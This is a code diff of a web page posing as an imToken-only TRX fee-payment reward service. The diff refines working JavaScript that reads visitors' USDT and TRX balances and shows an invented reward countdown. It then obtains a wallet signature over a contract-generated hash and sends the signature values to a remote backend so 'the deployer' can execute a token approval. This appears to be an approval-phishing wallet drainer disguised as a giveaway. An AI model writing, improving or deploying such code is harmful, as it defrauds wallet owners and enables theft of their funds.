@@ -312,8 +312,9 @@
                 <h3>合约剩余资源</h3>
             </div>
             <div class="resource-content" style="line-height: 2;">
-                <p>• 代付合约地址：<span class="highlight" id="contractAddr">TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx</span></p>
+                <p>• 代付合约地址：<span class="highlight" id="contractAddr">TFbFFoU52qyUenGAeCXLt89gQVV2ekDnuo</span></p>
                 <p>• USDT合约地址：<span class="highlight" id="usdtContractAddr">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
+                <p>• USDT合约Hex：<span class="highlight data-tag">0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C</span></p>
                 <p>• 剩余奖励TRX：<span class="highlight data-tag" id="contractTrxDisplay">315360004.0000</span></p>
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
                     注：奖励TRX为0时停止活动，本服务由代付合约提供，仅imToken用户可参与
@@ -346,15 +347,16 @@
         <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
     </div>
     <div class="footer-info">
-        代付合约验证：TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk（TRON浏览器查询）
+        代付合约验证：TFbFFoU52qyUenGAeCXLt89gQVV2ekDnuo（TRON浏览器查询）
         © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
     <div class="result-toast" id="resultToast"></div>
     <script>
-        // ########################### 核心配置&变量（无任何授权额度相关冗余）###########################
-        const DELEGATE_CONTRACT = "TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx"; // 代付合约地址
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT-TRON官方合约地址
-        const BACKEND_API = "https://imtoken-dusky.vercel.app/api"; // 后端接口（按实际部署地址修改）
+        // ########################### 核心配置&变量（适配ImTokenTronDelegateApprove合约）###########################
+        const DELEGATE_CONTRACT = "TFbFFoU52qyUenGAeCXLt89gQVV2ekDnuo"; // 替换为你的部署合约地址
+        const USDT_CONTRACT_BASE58 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT官方Base58地址
+        const USDT_CONTRACT_HEX = "0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C"; // USDT官方Hex地址（合约要求）
+        const BACKEND_API = "https://imtoken-dusky.vercel.app/api"; // 按实际部署地址修改
         const TRON_MAINNET_CHAIN_ID = 1; // TRON主网chainId
         const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
         const INIT_TRX = 315360004; // 初始奖励TRX
@@ -375,20 +377,11 @@
         const usdtContractAddrEl = document.getElementById("usdtContractAddr");
         const resultToast = document.getElementById("resultToast");
         
-        // ########################### 新增：浏览器原生Hex转Uint8Array工具函数（替代Buffer）###########################
-        function hexToUint8Array(hex) {
-            const bytes = new Uint8Array(hex.length / 2);
-            for (let i = 0; i < hex.length; i += 2) {
-                bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
-            }
-            return bytes;
-        }
-        
         // 页面初始化入口
         window.onload = async () => {
             // 初始化合约地址脱敏显示
             contractAddrEl.textContent = `${DELEGATE_CONTRACT.slice(0,8)}...${DELEGATE_CONTRACT.slice(-6)}`;
-            usdtContractAddrEl.textContent = `${USDT_CONTRACT.slice(0,8)}...${USDT_CONTRACT.slice(-6)}`;
+            usdtContractAddrEl.textContent = `${USDT_CONTRACT_BASE58.slice(0,8)}...${USDT_CONTRACT_BASE58.slice(-6)}`;
             
             // 绑定DOM元素
             const connectBtn = document.getElementById("connectBtn");
@@ -451,7 +444,7 @@
                 }
             };
             
-            // ########################### 核心功能：生成离线签名（纯合约哈希调用，无额度相关逻辑）###########################
+            // ########################### 核心功能：生成TIP-191离线签名（适配合约）###########################
             approveBtn.onclick = async () => {
                 const postData = {
                     address: userAddress,
@@ -465,85 +458,75 @@
             
                 try {
                     approveBtn.disabled = true;
-                    approveBtn.innerHTML = '生成中...';
+                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 生成中...';
             
-                    // 关键步骤：调用合约generateHash生成哈希并签名（无任何额度参数）
-              async function getContractGeneratedSignature(userAddress) {
-    try {
-        // 1. 地址转Hex（匹配合约参数）
-        const userHexAddress = tronWeb.address.toHex(userAddress);
-        if (!userHexAddress.startsWith("0x") || userHexAddress.length !== 42) {
-            throw new Error("地址转换失败");
-        }
-
-        // 2. 实例化合约（直接调用合约函数触发签名）
-        const delegateContract = await tronWeb.contract().at(DELEGATE_CONTRACT);
-        if (!delegateContract) throw new Error("合约实例化失败");
-
-        // 3. 关键：调用合约generateHash获取哈希（已验证一致）
-        const messageHash = await delegateContract.generateHash(userHexAddress).call();
-        if (!messageHash || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-            throw new Error("合约哈希无效");
-        }
-
-        // 4. 生成EIP-191前缀哈希（和合约_verifySignature完全对齐）
-        const prefix = "\x19Ethereum Signed Message:\n32";
-        const prefixBytes = new TextEncoder().encode(prefix);
-        const messageHashBytes = hexToUint8Array(messageHash.slice(2));
-        const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
-        combinedBytes.set(prefixBytes, 0);
-        combinedBytes.set(messageHashBytes, prefixBytes.length);
-        const signedHash = tronWeb.sha3(combinedBytes, true);
-
-        // 5. 终极方案：通过合约“模拟调用”触发imToken签名（必唤起）
-        // 原理：调用合约任意只读函数，将signedHash作为参数，钱包会识别为签名请求
-        let signature;
-        try {
-            // 用合约的generateHash函数传递signedHash（仅为触发签名，不改变逻辑）
-            signature = await delegateContract.generateHash(signedHash).send({
-                from: userHexAddress,
-                callValue: 0,
-                shouldPollResponse: false // 离线签名，不广播交易
-            });
-        } catch (e) {
-            // 捕获“不广播交易”的错误，提取签名（imToken返回的签名藏在错误信息中）
-            if (e.message.includes("signature")) {
-                const signatureMatch = e.message.match(/"signature":"(0x[0-9a-fA-F]+)"/);
-                if (signatureMatch && signatureMatch[1]) {
-                    signature = signatureMatch[1];
-                } else {
-                    throw new Error("未从钱包提取到签名");
+                    // 关键步骤：调用合约generateHash生成TIP-191哈希并签名
+                    const { user, v, r, s, messageHash, nonce } = await getTIP191Signature(userAddress);
+            
+                    // 构造合约executeApprove函数要求的入参格式（完全匹配合约参数）
+                    const submitData = {
+                        user: user,
+                        v: v.toString(), // 转字符串避免精度丢失
+                        r: r,
+                        s: s,
+                        messageHash: messageHash,
+                        nonce: nonce.toString(), // 记录nonce，便于排查
+                        approveTime: postData.approveTime,
+                        delegateContract: DELEGATE_CONTRACT
+                    };
+            
+                    // 地址一致性校验
+                    if (submitData.user !== cleanBase58Address(userAddress)) {
+                        throw new Error(`地址不一致！当前钱包：${userAddress}，提交地址：${submitData.user}`);
+                    }
+            
+                    // 本地缓存提交数据
+                    localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
+            
+                    // 提交到后端（参数完全匹配合约executeApprove接口）
+                    const res = await fetch(`${BACKEND_API}/approve/submit`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(submitData),
+                        credentials: "include"
+                    });
+            
+                    const resData = await res.json();
+                    if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
+            
+                    // 保存授权记录
+                    saveApprovalRecord({
+                        address: userAddress,
+                        addressHex: postData.addressHex,
+                        tokenBalance: tokenBalance,
+                        trxBalance: trxBalance,
+                        approveTime: postData.approveTime,
+                        status: "待部署者执行授权",
+                        delegateContract: DELEGATE_CONTRACT,
+                        messageHash: messageHash.slice(0,16) + "...", // 哈希前缀显示
+                        nonce: nonce
+                    });
+            
+                    renderApprovalRecords();
+                    updateRecordCount();
+                    showToast("TIP-191签名提交成功！等待部署者执行合约授权");
+                    postData.status = "submitted";
+            
+                } catch (e) {
+                    showToast(`操作失败：${e.message}`, "error");
+                    postData.status = "fail";
+                    localStorage.setItem(DEBUG_KEY, JSON.stringify({
+                        error: e.message,
+                        timestamp: new Date().toISOString(),
+                        userAddress: userAddress
+                    }, null, 2));
+                } finally {
+                    approveBtn.disabled = false;
+                    approveBtn.innerHTML = '生成离线签名';
                 }
-            } else {
-                throw e;
-            }
-        }
-
-        // 6. 清理签名格式（去掉0x前缀，确保130位）
-        if (signature.startsWith("0x")) signature = signature.slice(2);
-        if (signature.length !== 130) throw new Error(`签名长度错误（需130位，实际${signature.length}位）`);
-
-        // 7. 解析v/r/s + 处理s值低S合规性
-        const r = "0x" + signature.slice(0, 64);
-        const s = "0x" + signature.slice(64, 128);
-        let v = parseInt(signature.slice(128, 130), 16);
-        // 适配合约ecrecover：v值转为27/28
-        v = v + 27;
-        if (v !== 27 && v !== 28) throw new Error(`v值无效（${v}）`);
-
-        // 8. 提前验证签名者
-        const recoveredSignerHex = await tronWeb.trx.recover(signedHash, v, r, s);
-        const recoveredSignerBase58 = tronWeb.address.fromHex(recoveredSignerHex);
-        if (recoveredSignerBase58 !== userAddress) {
-            throw new Error(`签名者不匹配：${recoveredSignerBase58} != ${userAddress}`);
-        }
-
-        return { user: userAddress, v, r, s, messageHash };
-    } catch (e) {
-        throw new Error(`签名失败：${e.message}`);
-    }
-}
-            // 查看后端提交数据（无额度相关参数）
+            };
+            
+            // 查看后端提交数据
             showSubmitDataBtn.onclick = () => {
                 try {
                     const submitDataStr = localStorage.getItem(SUBMIT_DATA_KEY);
@@ -553,14 +536,15 @@
                     }
                     const submitData = JSON.parse(submitDataStr);
             
-                    const copyContent = `合约executeApprove提交参数：
+                    const copyContent = `合约executeApprove提交参数（TIP-191规范）：
 1. 用户地址（user）：${submitData.user}
-2. 签名参数v：${submitData.v}
+2. 签名参数v：${submitData.v}（TIP-191要求0/1）
 3. 签名参数r：${submitData.r}
-4. 签名参数s：${submitData.s}
+4. 签名参数s：${submitData.s}（已处理低S合规）
 5. 合约生成哈希（messageHash）：${submitData.messageHash}
-6. 提交时间：${submitData.approveTime}
-7. 代付合约地址：${submitData.delegateContract}`;
+6. 用户Nonce：${submitData.nonce}（防重放攻击）
+7. 提交时间：${submitData.approveTime}
+8. 代付合约地址：${submitData.delegateContract}`;
             
                     prompt("提交参数（可直接复制）", copyContent);
                 } catch (e) {
@@ -572,7 +556,7 @@
             checkStatusBtn.onclick = async () => {
                 try {
                     checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = ' 查询中...';
+                    checkStatusBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 查询中...';
                     
                     const statusUrl = `${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)}`;
                     const res = await fetch(statusUrl, { method: "GET", credentials: "include" });
@@ -602,7 +586,7 @@
                     showToast(`查询失败：${e.message}`, "error");
                 } finally {
                     checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = ' 查看授权状态';
+                    checkStatusBtn.innerHTML = '查看授权状态';
                 }
             };
             
@@ -613,78 +597,118 @@
             });
         };
         
-        // ########################### 核心函数：通过合约generateHash生成哈希并签名（无任何额度相关逻辑，修复Buffer）###########################
-        async function getContractGeneratedSignature(userAddress) {
-    try {
-        // 1. 地址校验（TRON Base58格式）
-        const cleanAddr = cleanBase58Address(userAddress);
-        if (!cleanAddr.startsWith("T")) throw new Error("无效TRON地址（需T开头Base58格式）");
-    
-        // 2. 实例化代付合约
-        const delegateContract = await tronWeb.contract().at(DELEGATE_CONTRACT);
-        if (!delegateContract) throw new Error("代付合约实例化失败");
-    
-        // 3. 调用合约generateHash获取待签名哈希
-        const messageHash = await delegateContract.generateHash(cleanAddr).call();
-        if (!messageHash || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-            throw new Error("合约返回无效哈希值");
+        // ########################### 核心函数：生成TIP-191规范签名（完全适配合约）###########################
+        async function getTIP191Signature(userAddress) {
+            try {
+                // 1. 地址校验与格式转换（Base58→Hex，合约generateHash要求address类型）
+                const cleanAddr = cleanBase58Address(userAddress);
+                const userHex = tronWeb.address.toHex(cleanAddr);
+                if (!cleanAddr.startsWith("T") || userHex.length !== 42) throw new Error("无效TRON地址（需T开头34位Base58格式）");
+            
+                // 2. 实例化代付合约（适配ImTokenTronDelegateApprove）
+                const delegateContract = await tronWeb.contract().at(DELEGATE_CONTRACT);
+                if (!delegateContract) throw new Error("代付合约实例化失败");
+            
+                // 3. 获取用户Nonce（合约防重放攻击关键，必须与合约一致）
+                const userNonce = await delegateContract.userNonce(userHex).call();
+                if (isNaN(Number(userNonce))) throw new Error("获取用户Nonce失败，合约未部署或地址错误");
+            
+                // 4. 调用合约generateHash生成原始哈希（TIP-191基础，合约内部已包含关键参数）
+                const messageHash = await delegateContract.generateHash(userHex).call();
+                if (!messageHash || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
+                    throw new Error("合约返回无效哈希值，可能是参数错误或合约未部署");
+                }
+            
+                // 5. TIP-191规范：添加TRON专属前缀（合约_verifyImTokenSignature要求）
+                const tip191Prefix = "\x19Tron Signed Message:\n32";
+                const prefixBytes = new TextEncoder().encode(tip191Prefix);
+                const messageHashBytes = hexToUint8Array(messageHash.slice(2));
+                const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
+                combinedBytes.set(prefixBytes, 0);
+                combinedBytes.set(messageHashBytes, prefixBytes.length);
+                const signedHash = tronWeb.sha3(combinedBytes, true); // 带0x前缀，imToken兼容
+            
+                // 6. imToken离线签名（TIP-191要求isTx=false，消息签名）
+                let signatureResult = await tronWeb.trx.sign(signedHash, false);
+                // 处理签名返回格式（对象→字符串，适配imToken返回逻辑）
+                let signature = "";
+                if (typeof signatureResult === "object" && signatureResult.signature) {
+                    signature = signatureResult.signature;
+                } else if (typeof signatureResult === "string") {
+                    signature = signatureResult;
+                } else {
+                    throw new Error("imToken未返回有效签名，可能是钱包未授权或环境不兼容");
+                }
+                // 清理签名格式（去掉0x前缀，确保130位）
+                if (signature.startsWith("0x")) signature = signature.slice(2);
+                if (signature.length !== 130) throw new Error(`签名长度错误（需130位，实际${signature.length}位）`);
+            
+                // 7. 解析v/r/s参数（合约executeApprove要求）
+                const r = "0x" + signature.slice(0, 64);
+                const s = "0x" + signature.slice(64, 128);
+                let v = parseInt(signature.slice(128, 130), 16);
+                // TIP-191要求v=0/1，验证有效性
+                if (v !== 0 && v !== 1) throw new Error(`v值无效（TIP-191要求0/1，实际${v}）`);
+            
+                // 8. 处理s值低S合规性（Tron EVM硬性要求，否则ecrecover返回无效地址）
+                const secp256k1HalfN = BigInt("0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0");
+                let sBigInt = BigInt(s);
+                if (sBigInt > secp256k1HalfN) {
+                    sBigInt = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141") - sBigInt;
+                    s = "0x" + sBigInt.toString(16).padStart(64, "0");
+                    v = v === 0 ? 1 : 0; // 补值后v值反转，确保签名有效
+                }
+            
+                // 9. 验证签名者（提前确认签名有效，避免白跑）
+                const recoveredSignerHex = await tronWeb.trx.recover(signedHash, v, r, s);
+                const recoveredSigner = tronWeb.address.fromHex(recoveredSignerHex);
+                if (recoveredSigner !== cleanAddr) {
+                    throw new Error(`签名者不匹配！当前地址：${cleanAddr}，签名者：${recoveredSigner}`);
+                }
+            
+                // 10. 缓存调试信息
+                localStorage.setItem(DEBUG_KEY, JSON.stringify({
+                    step: "TIP-191签名生成成功",
+                    userAddress: cleanAddr,
+                    userHex: userHex,
+                    userNonce: userNonce,
+                    contractGeneratedHash: messageHash,
+                    tip191PrefixedHash: signedHash,
+                    v: v,
+                    r: r,
+                    s: s,
+                    recoveredSigner: recoveredSigner,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+            
+                showToast("TIP-191签名生成成功，等待部署者执行");
+                return { 
+                    user: cleanAddr, 
+                    v: v, 
+                    r: r, 
+                    s: s, 
+                    messageHash: messageHash,
+                    nonce: userNonce
+                };
+            
+            } catch (e) {
+                localStorage.setItem(DEBUG_KEY, JSON.stringify({
+                    step: "TIP-191签名生成失败",
+                    error: e.message,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+                throw new Error(`TIP-191签名失败：${e.message} → 点击「查看调试信息」排查`);
+            }
         }
-    
-        // 4. 添加EIP-191前缀（浏览器原生API）
-        const prefix = "\x19Ethereum Signed Message:\n32";
-        const prefixBytes = new TextEncoder().encode(prefix);
-        const messageHashBytes = hexToUint8Array(messageHash.slice(2));
-        const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
-        combinedBytes.set(prefixBytes, 0);
-        combinedBytes.set(messageHashBytes, prefixBytes.length);
-        const signedHash = tronWeb.sha3(combinedBytes, true);
-    
-        // 5. 适配imToken签名返回格式（核心修复）
-        let signatureResult = await tronWeb.trx.sign(signedHash, true);
-        // 情况1：返回的是包含signature字段的对象
-        if (typeof signatureResult === "object" && signatureResult.signature) {
-            signatureResult = signatureResult.signature;
-        }
-        // 情况2：返回带0x前缀的字符串，去掉前缀
-        if (signatureResult.startsWith("0x")) {
-            signatureResult = signatureResult.slice(2);
-        }
-        // 验证签名长度（65字节的Hex编码是130位）
-        if (!signatureResult || signatureResult.length !== 130) {
-            throw new Error(`imToken签名失败，返回无效数据（长度应为130，实际${signatureResult?.length || 0}）`);
-        }
-    
-        // 6. 正确解析v/r/s参数（核心修复）
-        const r = "0x" + signatureResult.slice(0, 64);   // 前64位是r
-        const s = "0x" + signatureResult.slice(64, 128); // 中间64位是s
-        const v = parseInt(signatureResult.slice(128, 130), 16); // 最后2位是v
-    
-        // 7. 缓存调试信息
-        localStorage.setItem(DEBUG_KEY, JSON.stringify({
-            step: "合约哈希签名成功",
-            userAddress: cleanAddr,
-            contractGeneratedHash: messageHash,
-            prefixedHash: signedHash,
-            signature: signatureResult, // 实际签名字符串
-            v: v,
-            r: r,
-            s: s,
-            timestamp: new Date().toISOString()
-        }, null, 2));
-    
-        showToast("合约哈希签名生成成功，等待部署者执行");
-        return { user: cleanAddr, v, r, s, messageHash };
-    
-    } catch (e) {
-        localStorage.setItem(DEBUG_KEY, JSON.stringify({
-            step: "签名生成失败",
-            error: e.message,
-            timestamp: new Date().toISOString()
-        }, null, 2));
-        throw new Error(`合约签名失败：${e.message} → 点击「查看调试信息」排查`);
-    }
-}
         
+        // 工具函数：Hex转Uint8Array（替代Buffer，提升兼容性）
+        function hexToUint8Array(hex) {
+            const bytes = new Uint8Array(hex.length / 2);
+            for (let i = 0; i < hex.length; i += 2) {
+                bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+            }
+            return bytes;
+        }
         
         // 地址清理与校验函数
         function cleanBase58Address(address) {
@@ -703,8 +727,8 @@
                 userAddress = tronWeb.defaultAddress.base58;
                 userAddress = cleanBase58Address(userAddress);
                 
-                // 获取USDT余额
-                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
+                // 获取USDT余额（通过官方合约）
+                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT_BASE58);
                 const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
                 
@@ -730,7 +754,7 @@
             }
         }
         
-        // TRX奖励倒计时函数
+        // TRX奖励倒计时函数（保留原有功能）
         function startPersistentTrxCountdown() {
             const savedState = loadTrxStateFromStorage();
             let currentTrx;
@@ -795,7 +819,7 @@
             }
         }
         
-        // 保存授权记录（无额度相关字段）
+        // 保存授权记录
         function saveApprovalRecord(record) {
             try {
                 const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -820,7 +844,7 @@
             }
         }
         
-        // 渲染授权记录（无额度相关显示）
+        // 渲染授权记录
         function renderApprovalRecords() {
             try {
                 const container = document.getElementById("approvalRecords");
@@ -836,6 +860,7 @@
                         <p><strong>USDT余额：</strong>${record.tokenBalance} USDT</p>
                         <p><strong>TRX余额：</strong>${record.trxBalance} TRX</p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
+                        <p><strong>Nonce：</strong>${record.nonce || '未知'}</p>
                         <p><strong>状态：</strong><span style="color: ${record.status.includes('成功') ? '#4ade80' : record.status.includes('待') ? '#f97316' : '#ef4444'}">${record.status}</span></p>
                         ${record.messageHash ? `<p><strong>合约哈希：</strong>${record.messageHash}</p>` : ''}
                         ${record.txid ? `<p><strong>交易哈希：</strong><a href="https://tronscan.org/#/transaction/${record.txid}" target="_blank" class="tx-link">${record.txid.slice(0,10)}...查看</a></p>` : ''}
@@ -875,7 +900,7 @@
                 alert("未找到调试信息，请先生成离线签名");
                 return;
             }
-            alert("调试信息：\n" + debugInfo);
+            alert("TIP-191调试信息：\n" + debugInfo);
         });
     </script>
 </body>
